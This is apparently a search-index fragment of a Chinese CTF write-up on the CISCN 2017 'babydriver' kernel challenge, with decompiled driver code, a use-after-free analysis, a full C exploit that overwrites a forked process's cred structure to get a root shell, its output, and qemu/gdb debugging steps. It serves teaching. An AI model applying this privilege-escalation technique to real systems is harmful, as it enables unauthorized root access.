[ 0000006 8 BYTES . COLLAPSED STRUCT cdev . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000040 BYTES . COLLAPSED STRUCT kobject . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000010 BYTES . COLLAPSED STRUCT list_head . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000004 BYTES . COLLAPSED STRUCT kref . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000004 BYTES . COLLAPSED STRUCT atomic_t . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 000000 D8 BYTES . COLLAPSED STRUCT file_operations . PRESS CTRL - NUMPAD + TO EXPAND ] 00000000 ; [ 00000040 BYTES . COLLAPSED STRUCT modversion_info . PRESS CTRL - NUMPAD + TO EXPAND ] ...... \u8fd9\u91cc\u6709\u51e0\u4e2a\u7ed3\u6784\u4f53\u662f\u9700\u8981\u5206\u6790\u7684\uff0c\u9996\u5148\u662f file_operations \uff0c\u5c55\u5f00\u540e\u662f\u5982\u4e0b\u5185\u5bb9\uff1a 00000000 file_operations struc ; ( sizeof = 0xD8 , align = 0x8 , copyof_138 ) 00000000 ; XREF : . data : fops / r 00000000 owner dq ? ; offset 0000000 8 llseek dq ? ; offset 00000010 read dq ? ; offset 0000001 8 write dq ? ; offset 00000020 read_iter dq ? ; offset 0000002 8 write_iter dq ? ; offset 00000030 iterate dq ? ; offset 0000003 8 poll dq ? ; offset 00000040 unlocked_ioctl dq ? ; offset 0000004 8 compat_ioctl dq ? ; offset 00000050 mmap dq ? ; offset 0000005 8 open dq ? ; offset 00000060 flush dq ? ; offset 0000006 8 release dq ? ; offset 00000070 fsync dq ? ; offset 0000007 8 aio_fsync dq ? ; offset 000000 80 fasync dq ? ; offset 000000 88 lock dq ? ; offset 000000 90 sendpage dq ? ; offset 000000 98 get_unmapped_area dq ? ; offset 000000 A0 check_flags dq ? ; offset 000000 A8 flock dq ? ; offset 000000 B0 splice_write dq ? ; offset 000000 B8 splice_read dq ? ; offset 000000 C0 setlease dq ? ; offset 000000 C8 fallocate dq ? ; offset 000000 D0 show_fdinfo dq ? ; offset 000000 D8 file_operations ends \u8fd9\u4e2a\u7ed3\u6784\u4f53\u91cc\u4f1a\u8bb0\u5f55\u5bf9\u8bbe\u5907\u7684\u6587\u4ef6\u64cd\u4f5c\u88ab\u91cd\u5b9a\u5411\u5230\u4e86\u4ec0\u4e48\u51fd\u6570\uff0c\u8fd9\u91cc\u53ef\u4ee5xref\u4e00\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230init\u51fd\u6570babydriver_init()\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u5185\u5bb9\u4e3a\uff1a cdev_init( cdev_0, fops); \u5176\u4e2d fops\u662f\u4e00\u4e2afile_operations\u7ed3\u6784\u4f53\u7684\u5b9e\u4f8b\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a ```cpp= .data:00000000000008C0 ; file_operations fops .data:00000000000008C0 fops file_operations .data:00000000000008C0 _data ends \u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u77e5\u9053\u5bf9\u8bbe\u5907\u6587\u4ef6\u7684\u64cd\u4f5c\u4f1a\u901a\u8fc7\u5982\u4e0b\u51fd\u6570\u8fdb\u884c\u5904\u7406\uff08\u6ce8\u610f\u8fd9\u91ccIDA\u663e\u793a\u7684\u6709\u4e9b\u95ee\u9898\uff0crelease\u5176\u5b9e\u5bf9\u5e94\u7684\u662fbabyrelease\uff09\uff1a * open: babyopen * read: babyread * write: babywrite * ioctl: babyioctl * release: babyrelease \u7b2c\u4e8c\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u7ed3\u6784\u4f53\u662fbabydevice_t ```cpp 00000000 babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429) 00000000 ; XREF: .bss:babydev_struct/r 00000000 device_buf dq ? ; XREF: babyrelease+6/r 00000000 ; babyopen+26/w ... ; offset 00000008 device_buf_len dq ? ; XREF: babyopen+2D/w 00000008 ; babyioctl+3C/w ... 00000010 babydevice_t ends \u8be5\u7ed3\u6784\u4f53\u4e00\u5171 0x10 \u4e2a\u5b57\u8282\uff0c\u5176\u4e2d\u524d8\u4e2a\u5b57\u8282\u662f device_buf \uff0c\u540e2\u4e2a\u5b57\u8282\u662f bevice_buf_len \u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5bf9\u7a0b\u5e8f\u4e2d\u7684\u51fd\u6570\u8fdb\u884c\u5206\u6790\u3002","title":"LKM\u9006\u5411"},{"location":"kernel/ciscn_2017_babydriver_UAF/#babyopen","text":"\u5728\u8bbe\u5907\u6587\u4ef6\u6253\u5f00\u65f6\u4f1a\u6267\u884cbabyopen\u51fd\u6570\uff0cbabyopen\u51fd\u6570\u5982\u4e0b\uff1a int __fastcall babyopen ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); babydev_struct . device_buf = ( char * ) kmem_cache_alloc_trace ( kmalloc_caches [ 6 ], 37748928LL , 64LL ); babydev_struct . device_buf_len = 64LL ; printk ( device open \\n , 37748928LL , v2 ); return 0 ; } \u6bcf\u6b21open\u7684\u65f6\u5019\u90fd\u4f1a\u901a\u8fc7kmalloc\u7533\u8bf7\u4e00\u575764\u5b57\u8282\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u628a\u6307\u9488\u5b58\u50a8\u5728bss\u4e0a\u7684\u5168\u5c40\u53d8\u91cfbabydev_struct\u4e2d\uff0c\u540c\u65f6\u66f4\u65b0babydev_struct\u7684device_buf_len\u4e3a64\u3002","title":"babyopen"},{"location":"kernel/ciscn_2017_babydriver_UAF/#babyread","text":"\u5728\u5bf9\u6253\u5f00\u7684\u8bbe\u5907\u8fdb\u884cread\u64cd\u4f5c\u65f6\u4f1a\u6267\u884cbabyread\u51fd\u6570\uff0cbabyread\u51fd\u6570\u5982\u4e0b\uff1a ssize_t __fastcall babyread ( file * filp , char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx ssize_t result ; // rax ssize_t v6 ; // rbx _fentry__ ( filp , buffer ); if ( ! babydev_struct . device_buf ) return - 1LL ; result = - 2LL ; if ( babydev_struct . device_buf_len v4 ) { v6 = v4 ; copy_to_user ( buffer ); result = v6 ; } return result ; } \u8be5\u51fd\u6570\u9996\u5148\u68c0\u67e5\u4e86 babydev_struct \u7684 device_buf_len \u662f\u5426\u6bd4\u8981\u8bfb\u7684\u957f\u5ea6\u5927\uff0c\u6ee1\u8db3\u6761\u4ef6\u7684\u8bdd\uff0c\u5c31\u628a babydev_struct.device_buf \u6307\u5411\u7684\u6570\u636e\u62f7\u8d1d\u5230buffer \u4e2d\uff0cbuffer\u548c\u957f\u5ea6\u90fd\u662f\u7528\u6237\u4f20\u9012\u7684\u53c2\u6570\uff0c\u5176\u4e2dbuffer\u662f\u7528\u6237\u6001\u7684\u5730\u5740\u3002","title":"babyread"},{"location":"kernel/ciscn_2017_babydriver_UAF/#babywrite","text":"\u5728\u5bf9\u8bbe\u5907\u6587\u4ef6\u8fdb\u884cwrite\u64cd\u4f5c\u65f6\uff0c\u4f1a\u6267\u884cbabywrite\u51fd\u6570\uff0c\u51fd\u6570\u5185\u5bb9\u5982\u4e0b\uff1a ssize_t __fastcall babywrite ( file * filp , const char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx ssize_t result ; // rax ssize_t v6 ; // rbx _fentry__ ( filp , buffer ); if ( ! babydev_struct . device_buf ) return - 1LL ; result = - 2LL ; if ( babydev_struct . device_buf_len v4 ) { v6 = v4 ; copy_from_user ( babydev_struct . device_buf , ( void * ) buffer , ( void * ) v4 ); result = v6 ; } return result ; } \u9996\u5148\u68c0\u67e5\u4f20\u5165\u7684\u957f\u5ea6\u662f\u5426\u6ee1\u8db3\u5c0f\u4e8e device_buf_len ,\u7136\u540e\u5c06\u7528\u6237\u6001buffer\u4e2d\u7684\u5185\u5bb9\u62f7\u8d1d\u5230 babydev_struct.device_buf \u6307\u5411\u7684\u7a7a\u95f4\u3002","title":"babywrite"},{"location":"kernel/ciscn_2017_babydriver_UAF/#babyioctl","text":"__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg) { size_t v3; // rdx size_t v4; // rbx __int64 v5; // rdx __int64 result; // rax _fentry__(filp, *(_QWORD *) command); v4 = v3; if ( command == 0x10001 ) { kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL); babydev_struct.device_buf_len = v4; printk( alloc done\\n , 37748928LL, v5); result = 0LL; } else { printk( unk_2EB, v3, v3); result = -22LL; } return result; } \u5b9a\u4e49\u4e86 0x10001 \u7684\u547d\u4ee4\uff0c\u7528\u6237\u6001\u53ef\u4ee5\u901a\u8fc7ioctl\u8fdb\u884c\u4ea4\u4e92\uff0c\u8be5\u51fd\u6570\u9996\u5148\u91ca\u653e\u4e86 babydev_struct.device_buf \u6307\u5411\u7684\u5185\u5b58\uff0c\u518d\u6839\u636e\u7528\u6237\u4f20\u9012\u7684\u53c2\u6570\u91cd\u65b0\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\uff0c\u5e76\u628a\u957f\u5ea6\u8d4b\u503c\u7ed9 babydev_struct.device_buf_len \u3002","title":"babyioctl"},{"location":"kernel/ciscn_2017_babydriver_UAF/#babyrelease","text":"int __fastcall babyrelease ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); kfree ( babydev_struct . device_buf ); printk ( device release \\n , filp , v2 ); return 0 ; } \u5173\u95ed\u8bbe\u5907\u6587\u4ef6\u7684\u65f6\u5019\u4f1a\u91ca\u653e babydev_struct.device_buf \u3002","title":"babyrelease"},{"location":"kernel/ciscn_2017_babydriver_UAF/#_2","text":"\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2aUAF\u6f0f\u6d1e\uff0cbabydev_struct\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u5982\u679c\u6211\u4eecopen\u8bbe\u5907\u4e24\u6b21\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21open\u7684\u65f6\u5019\u5c31\u4f1a\u8986\u76d6\u7b2c\u4e00\u6b21open\u7684babydev_struct\uff0c\u6b64\u65f6free\u6389\u7b2c\u4e00\u4e2a\uff0c\u7b2c\u4e8c\u4e2a\u6307\u5411\u7684\u5c31\u662ffree\u540e\u7684\uff0c\u56e0\u6b64\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2aUAF\u3002 \u8fd9\u91cc\u8003\u8651\u7684\u4e00\u79cd\u7b80\u5355\u7684\u5229\u7528\u65b9\u6cd5\u5229\u7528UAF\u53bb\u4fee\u6539\u65b0\u8fdb\u7a0b\u7684CRED\u7ed3\u6784\uff0c\u4ece\u800c\u6253\u6210\u6743\u9650\u63d0\u5347\u7684\u6548\u679c\u3002\u9996\u5148\u6211\u4eec\u770b\u4e00\u4e0b\u8be5\u5185\u6838\u7248\u672c\u7684CRED\u7ed3\u6784\uff1a struct cred { atomic_t usage ; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers ; /* number of processes subscribed */ void * put_addr ; unsigned magic ; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid ; /* real UID of the task */ kgid_t gid ; /* real GID of the task */ kuid_t suid ; /* saved UID of the task */ kgid_t sgid ; /* saved GID of the task */ kuid_t euid ; /* effective UID of the task */ kgid_t egid ; /* effective GID of the task */ kuid_t fsuid ; /* UID for VFS ops */ kgid_t fsgid ; /* GID for VFS ops */ unsigned securebits ; /* SUID-less security management */ kernel_cap_t cap_inheritable ; /* caps our children can inherit */ kernel_cap_t cap_permitted ; /* caps we re permitted */ kernel_cap_t cap_effective ; /* caps we can actually use */ kernel_cap_t cap_bset ; /* capability bounding set */ kernel_cap_t cap_ambient ; /* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char jit_keyring ; /* default keyring to attach requested * keys to */ struct key __rcu * session_keyring ; /* keyring inherited over fork */ struct key * process_keyring ; /* keyring private to this process */ struct key * thread_keyring ; /* keyring private to this thread */ struct key * request_key_auth ; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void * security ; /* subjective LSM security */ #endif struct user_struct * user ; /* real user ID subscription */ struct user_namespace * user_ns ; /* user_ns the caps and keyrings are relative to. */ struct group_info * group_info ; /* supplementary groups for euid/fsgid */ struct rcu_head rcu ; /* RCU deletion hook */ }; \u5927\u5c0f\u4e3a0xa8\uff0c\u90a3\u4e48\u5229\u7528\u601d\u8def\u5c31\u5f88\u660e\u786e\u4e86\uff1a 1. \u9996\u5148\u6253\u5f00babydev\u4e24\u6b21\uff0c\u6b64\u65f6\u7b2c\u4e8c\u6b21\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u8986\u76d6\u7b2c\u4e00\u6b21\u7533\u8bf7\u7684\u5185\u5b58\u5730\u5740\uff1b 2. \u901a\u8fc7ioctl\u4fee\u6539\u5185\u5b58\u5927\u5c0f\u4e3a0xa8\uff0c\u4e5f\u5c31\u662fcred\u7684\u5927\u5c0f\uff1b 3. \u5173\u95ed\u7b2c\u4e00\u4e2a\u53e5\u67c4\uff0c\u6b64\u65f6\u4f1a\u6267\u884cbabyrelease\u51fd\u6570\uff0c\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u7ed3\u6784\u4f53\u6307\u5411\u76840xa8\u5927\u5c0f\u7684\u5185\u5b58\u4f1a\u88ab\u91ca\u653e\uff0c\u800c\u7b2c\u4e8c\u4e2a\u6587\u4ef6\u53e5\u67c4\u4f9d\u7136\u5b58\u5728\uff0c\u56e0\u6b64\u6211\u4eec\u83b7\u5f97\u4e86\u4e00\u4e2a\u60ac\u5782\u6307\u9488\uff08\u6307\u5411\u88ab\u91ca\u653e\u7684\u5185\u5b58\uff09\uff1b 4. \u8fd9\u65f6fork\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u65b0\u8fdb\u7a0b\u7684cred\u6b63\u597d\u7533\u8bf7\u5728\u6211\u4eec\u91ca\u653e\u7684\u4f4d\u7f6e\uff1b 5. \u901a\u8fc7\u60ac\u5782\u6307\u9488\u6211\u4eec\u53ef\u4ee5write\u65b0\u8fdb\u7a0bcred\u4e2d\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u5b9e\u73b0\u65b0\u8fdb\u7a0b\u7684\u6743\u9650\u63d0\u5347\u3002 \u4e0b\u9762\u7f16\u5199UAF\u7684\u5229\u7528\u7a0b\u5e8f\uff1a #include stdio.h #include stdlib.h #include unistd.h #include fcntl.h #include stropts.h #include sys/wait.h #include sys/stat.h int main () { // \u6253\u5f00\u4e24\u6b21\u8bbe\u5907 int fd1 = open ( /dev/babydev , 2 ); int fd2 = open ( /dev/babydev , 2 ); // \u4fee\u6539 babydev_struct.device_buf_len \u4e3a sizeof(struct cred) ioctl ( fd1 , 0x10001 , 0xa8 ); // \u91ca\u653e fd1 close ( fd1 ); // \u65b0\u8d77\u8fdb\u7a0b\u7684 cred \u7a7a\u95f4\u4f1a\u548c\u521a\u521a\u91ca\u653e\u7684 babydev_struct \u91cd\u53e0 int pid = fork (); if ( pid 0 ) { puts ( [*] fork error! ); exit ( 0 ); } else if ( pid == 0 ) { // \u901a\u8fc7\u66f4\u6539 fd2\uff0c\u4fee\u6539\u65b0\u8fdb\u7a0b\u7684 cred \u7684 uid\uff0cgid \u7b49\u503c\u4e3a0 char zeros [ 30 ] = { 0 }; write ( fd2 , zeros , 28 ); if ( getuid () == 0 ) { puts ( [+] root now. ); system ( /bin/sh ); exit ( 0 ); } } else { wait ( NULL ); } close ( fd2 ); return 0 ; } \u6211\u4eec\u5bf9exp\u8fdb\u884c\u7f16\u8bd1\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u9898\u76ee\u7684kernel\u91cc\u9762\u6ca1\u6709libc\uff0c\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u9759\u6001\u7f16\u8bd1exp: \u279c Desktop gcc exp.c -static -o exploit \u279c Desktop file exploit exploit: ELF 64 -bit LSB executable, x86-64, version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= b4df5ea181b300281f32a5e9a974ccd2f24f2ee3, not stripped \u56e0\u4e3a\u6211\u4eec\u662f\u672c\u5730\u8c03\u8bd5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5c06exp\u76f4\u63a5\u653e\u5165\u5230rootfs\u76ee\u5f55\u4e2d\u5e76\u91cd\u65b0\u6253\u5305\uff1a \u279c Desktop cp exploit ./rootfs/home/ctf/ \u279c Desktop cd rootfs \u279c rootfs find . | cpio -o --format = newc ../rootfs.cpio 7216 blocks \u63a5\u4e0b\u6765\u76f4\u63a5\u8fd0\u884c\u5e76\u6267\u884cexp\u5c31\u53ef\u4ee5\u62ff\u5230root\u6743\u9650\uff1a / $ cd /home/ctf ~ $ ls exploit ~ $ ./exploit [ 22 .269245 ] device open [ 22 .270112 ] device open [ 22 .271025 ] alloc done [ 22 .271863 ] device release [ + ] root now. /home/ctf # id uid = 0 ( root ) gid = 0 ( root ) groups = 1000 ( ctf )","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"kernel/ciscn_2017_babydriver_UAF/#_3","text":"\u5728\u65b0\u7248\u672c\u7684\u5185\u6838\u4e2d\u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u65e0\u6548\u4e86\uff0c\u56e0\u4e3a\u65b0\u8fdb\u7a0b\u7684cred\u7ed3\u6784\u4f53\u4f1a\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u533a\u57df\u8fdb\u884c\u7533\u8bf7\uff0c\u56e0\u6b64UAF\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528\u6210\u529f\uff0c\u8fd9\u79cd\u65b0\u7684\u7279\u5f81\u53eb\u505alockdown\uff0c\u8be6\u7ec6\u53ef\u4ee5\u53c2\u8003\uff1a lockdown","title":"\u5ef6\u7533"},{"location":"kernel/ciscn_2017_babydriver_UAF/#_4","text":"\u6211\u4eec\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ece\u5185\u6838\u7684bzImage\u6587\u4ef6\u4e2d\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u811a\u672c\u63d0\u53d6\u51fa\u5185\u6838\u7b26\u53f7\u6587\u4ef6vmlinux: /usr/src/linux-headers- $( uname -r ) /scripts/extract-vmlinux \u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a \u279c Desktop /usr/src/linux-headers-4.15.0-54/scripts/extract-vmlinux bzImage vmlinux \u279c Desktop file vmlinux vmlinux: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , statically linked, BuildID [ sha1 ]= e993ea9809ee28d059537a0d5e866794f27e33b4, stripped \u63a5\u4e0b\u6765\u4fee\u6539\u4e00\u4e0b\u542f\u52a8\u811a\u672c\uff0c\u9996\u5148\u9700\u8981\u5728\u542f\u52a8\u547d\u4ee4\u540e\u6dfb\u52a0 -gdb tcp::1234 -S \u3002 #!/bin/bash qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append console=ttyS0 root=/dev/ram oops=panic panic=1 -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores = 1 ,threads = 1 -cpu kvm64,+smep -gdb tcp::1234 -S \u7136\u540e\u8fd0\u884c\u542f\u52a8\u811a\u672c\uff0c\u8fd9\u65f6\u865a\u62df\u673a\u4f1a\u505c\u7b49\u5f85gdb\u8fde\u63a5\u3002\u4f7f\u7528 gdb ./vmlinux \u542f\u52a8gdb\uff0c\u5e76\u8fdc\u7a0b\u8fde\u63a5\u5230qemu\uff0c\u6267\u884cc\uff0c\u8ba9\u865a\u62df\u673a\u7ee7\u7eed\u8fd0\u884c: gdb ./vmlinux ... pwndbg target remote localhost:1234 pwndbg c \u865a\u62df\u673a\u8fd0\u884c\u540e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u6765\u770bko\u6587\u4ef6.text\u6bb5\u7684\u5730\u5740\uff1a / $ cat /sys/module/babydriver/sections/.text 0xffffffffc0000000 \u63a5\u4e0b\u6765\u52a0\u5165ko\u6587\u4ef6\u7684\u7b26\u53f7\u8868\uff0c\u5728gdb\u4e2d\u8fd0\u884c add-symbol-file core.ko textaddr \u5373\u53ef\uff1a pwndbg add-symbol-file babydriver.ko 0xffffffffc0000000 add symbol table from file babydriver.ko at .text_addr = 0xffffffffc0000000 Reading symbols from babydriver.ko...done. \u7136\u540e\u5c31\u53ef\u4ee5\u8c03\u8bd5\u4e86\uff0c\u6b64\u65f6\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5b\u51fd\u6570\u540d\uff08\u56e0\u4e3ako\u6587\u4ef6\u91cc\u9762\u5e26\u6709\u7b26\u53f7\u8868\uff09\uff1a pwndbg b babyopen Breakpoint 1 at 0xffffffffc0000030: file /home/atum/PWN/my/babydriver/kernelmodule/babydriver.c, line 28. pwndbg c Continuing. \u6b64\u65f6\u6211\u4eec\u518d\u8fd0\u884cexp\u4eec\u5c31\u4f1a\u6210\u529f\u65ad\u5230babyopen\u3002\u5982\u679c\u6ca1\u6709\u7b26\u53f7\u4fe1\u606f\u7684\u8bdd\uff0c\u5c31\u53ea\u80fd\u8ba1\u7b97\u5730\u5740\u76f4\u63a5b\u3002","title":"\u5982\u4f55\u8c03\u8bd5"},{"location":"kernel/linux_kernel_base/","text":"Linux\u5185\u6838\u7ed3\u6784 Linux\u4f5c\u4e3a\u4e00\u79cd\u5f00\u6e90\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5176\u5185\u6838\uff08Linux Kernel\uff0c\u540e\u7eed\u79f0\u5176\u4e3aKernel\uff09\u7531C\u8bed\u8a00\u7f16\u5199\u3002\u4f5c\u4e3a\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\uff0c\u5176\u5177\u5907\u4e86\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u5e94\u8be5\u5177\u5907\u7684\u6240\u6709\u529f\u80fd\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0cKernel\u8d77\u5230\u4e86\u627f\u4e0a\u542f\u4e0b\u7684\u4f5c\u7528\uff0c\u4e00\u65b9\u9762\u80fd\u591f\u63a7\u5236\u5e76\u4e0e\u786c\u4ef6\u8fdb\u884c\u4ea4\u4e92\uff0c\u53e6\u4e00\u65b9\u9762\u5411\u5e94\u7528\u5c42\u63d0\u4f9b\u4e86\u8fd0\u884c\u73af\u5883\u3002\u901a\u8fc7\u5185\u6838\u53ef\u4ee5\u5b9e\u73b0I/O\uff0c\u6743\u9650\u63a7\u5236\uff0c\u7cfb\u7edf\u8c03\u7528\uff0c\u8fdb\u7a0b\u7ba1\u7406\uff0c\u5185\u5b58\u7ba1\u7406\u7b49\u591a\u9879\u529f\u80fd\u3002\u4e00\u65e6Kernel\u51fa\u73b0\u4e86\u6f0f\u6d1e\uff0c\u90a3\u4e48\u5c31\u4f1a\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u672c\u8eab\u4ea7\u751f\u7834\u574f\uff0c\u901a\u5e38\u4f1a\u5f15\u8d77\u91cd\u542f\u3002\u5185\u6838\u6f0f\u6d1e\u6700\u5e38\u7528\u4e8e\u6743\u9650\u63d0\u5347\u3002 \u5185\u6838\u548c\u7528\u6237\u7a7a\u95f4\u7684\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u4e0d\u540c\u7684\u4fdd\u62a4\u5730\u5740\u7a7a\u95f4\u3002\u6bcf\u4e2a\u7528\u6237\u7a7a\u95f4\u7684\u8fdb\u7a0b\u90fd\u4f7f\u7528\u81ea\u5df1\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u800c\u5185\u6838\u5219\u5360\u7528\u5355\u72ec\u7684\u5730\u5740\u7a7a\u95f4\u3002Intel CPU\u628aCPU\u7684\u7279\u6743\u7ea7\u5206\u4e3aRing 0\uff0cRing 1\uff0cRing 2\uff0cRing3\u56db\u79cd\uff0c\u5176\u4e2dRing 0\u662f\u5185\u6838\u4f7f\u7528\u7684\u7279\u6743\u7ea7\uff0cRing 3 \u662f\u6240\u6709\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u4f7f\u7528\u7684\u7279\u6743\u7ea7\u3002\u5185\u5c42\u7279\u6743\u7ea7\u53ef\u4ee5\u4f7f\u7528\u5916\u5c42\u7279\u6743\u7ea7\u7684\u8d44\u6e90\u3002\u4f7f\u7528\u8fd9\u79cd\u7684\u7279\u6743\u7ea7\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u64cd\u4f5c\u7cfb\u7edf\u7684\u5b89\u5168\u800c\u8fdb\u884c\u6743\u9650\u9694\u79bb\u3002 Linux\u5185\u6838\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5212\u5206\u4e3a3\u6210\uff0c\u6700\u4e0a\u5c42\u662f\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\uff08SCI\uff0cSystem Call Interface\uff09\uff0c\u5b9e\u73b0\u4e86\u57fa\u672c\u7684\u529f\u80fd\uff0c\u4f8b\u5982open\u3001read\u3001write\u7b49\uff1bSCI\u5c42\u4ee5\u4e0b\u7684\u5185\u6838\u4ee3\u7801\uff0c\u4f9d\u8d56\u4e8e\u4f53\u7cfb\u7ed3\u6784\uff0c\u88ab\u79f0\u4e3aBSP\uff08Board Support Package\uff09\u7684\u90e8\u5206\u3002\u8fd9\u4e9b\u4ee3\u7801\u7528\u4f5c\u7ed9\u5b9a\u4f53\u7cfb\u7ed3\u6784\u7684\u5904\u7406\u5668\u548c\u7279\u5b9a\u4e8e\u5e73\u53f0\u7684\u4ee3\u7801\u3002 Linux \u5185\u6838\u5b9e\u73b0\u4e86\u5f88\u591a\u91cd\u8981\u7684\u4f53\u7cfb\u7ed3\u6784\u5c5e\u6027\u3002\u5728\u6216\u9ad8\u6216\u4f4e\u7684\u5c42\u6b21\u4e0a\uff0c\u5185\u6838\u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u5b50\u7cfb\u7edf\u3002Linux \u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u6574\u4f53\uff0c\u56e0\u4e3a\u5b83\u4f1a\u5c06\u6240\u6709\u8fd9\u4e9b\u57fa\u672c\u670d\u52a1\u90fd\u96c6\u6210\u5230\u5185\u6838\u4e2d\u3002\u8fd9\u4e0e\u5fae\u5185\u6838\u7684\u4f53\u7cfb\u7ed3\u6784\u4e0d\u540c\uff0c\u540e\u8005\u4f1a\u63d0\u4f9b\u4e00\u4e9b\u57fa\u672c\u7684\u670d\u52a1\uff0c\u4f8b\u5982\u901a\u4fe1\u3001I/O\u3001\u5185\u5b58\u548c\u8fdb\u7a0b\u7ba1\u7406\uff0c\u66f4\u5177\u4f53\u7684\u670d\u52a1\u90fd\u662f\u63d2\u5165\u5230\u5fae\u5185\u6838\u5c42\u4e2d\u7684\u3002\u6bcf\u79cd\u5185\u6838\u90fd\u6709\u81ea\u5df1\u7684\u4f18\u70b9\u3002Linux\u7f16\u8bd1\u540e\u53ef\u5728\u5927\u91cf\u5904\u7406\u5668\u548c\u5177\u6709\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u7ea6\u675f\u548c\u9700\u6c42\u7684\u5e73\u53f0\u4e0a\u8fd0\u884c\u3002\u4e00\u4e2a\u4f8b\u5b50\u662fLinux\u53ef\u4ee5\u5728\u4e00\u4e2a\u5177\u6709\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff08MMU\uff09\u7684\u5904\u7406\u5668\u4e0a\u8fd0\u884c\uff0c\u4e5f\u53ef\u4ee5\u5728\u90a3\u4e9b\u4e0d\u63d0\u4f9bMMU\u7684\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002Linux\u5185\u6838\u7684uClinux\u79fb\u690d\u63d0\u4f9b\u4e86\u5bf9\u975eMMU \u7684\u652f\u6301\u3002 \u4e0b\u9762\u4ecb\u7ecdLinux\u5185\u6838\u5305\u542b\u4e86\u54ea\u4e9b\u5185\u5bb9\uff1a \u7cfb\u7edf\u8c03\u7528\u63a5\u53e3 \uff1aSCI \u5c42\u63d0\u4f9b\u4e86\u67d0\u4e9b\u673a\u5236\u6267\u884c\u4ece\u7528\u6237\u7a7a\u95f4\u5230\u5185\u6838\u7684\u51fd\u6570\u8c03\u7528\u3002\u6b63\u5982\u524d\u9762\u8ba8\u8bba\u7684\u4e00\u6837\uff0c\u8fd9\u4e2a\u63a5\u53e3\u4f9d\u8d56\u4e8e\u4f53\u7cfb\u7ed3\u6784\uff0c\u751a\u81f3\u5728\u76f8\u540c\u7684\u5904\u7406\u5668\u5bb6\u65cf\u5185\u4e5f\u662f\u5982\u6b64\u3002SCI \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u975e\u5e38\u6709\u7528\u7684\u51fd\u6570\u8c03\u7528\u591a\u8def\u590d\u7528\u548c\u591a\u8def\u5206\u89e3\u670d\u52a1; \u8fdb\u7a0b\u7ba1\u7406 